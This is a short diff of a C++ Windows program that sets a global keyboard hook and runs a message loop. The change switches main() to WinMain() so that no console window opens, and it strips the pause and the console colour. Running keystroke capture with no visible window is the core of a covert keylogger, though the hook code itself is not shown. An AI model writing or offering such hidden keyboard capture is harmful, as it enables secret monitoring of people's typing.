@@ -4,10 +4,11 @@
 
 using namespace std;
 
-int main()
+// Using WinMain() removes any terminal opening
+// int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow)
 {
-   // Change text color to green
-   SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
+   // SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
 
    // The one and only... keyboard hook
    KeyboardHook hook;
@@ -16,22 +17,22 @@ int main()
       // Attach the hook
       if (!hook.setHook())
          throw Error{ 10, "Could not set hook." };
-      cout << "Success" << endl;
+      cout << "Hook attached." << endl;
 
       // Start up the message handler
       MessageHandler handler;
       handler.handle();
 
-      // Remove the hook
+      // Remove the hook completely
       if (!hook.removeHook())
          throw Error{ 20, "Could not remove hook." };
-      cout << "Success" << endl;
-
-      system("pause");
+      cout << "Hook removed." << endl;
    }
    // Print error message
    catch (const Error error)
    {
       cout << error << endl;
    }
+
+   return 0;
 }
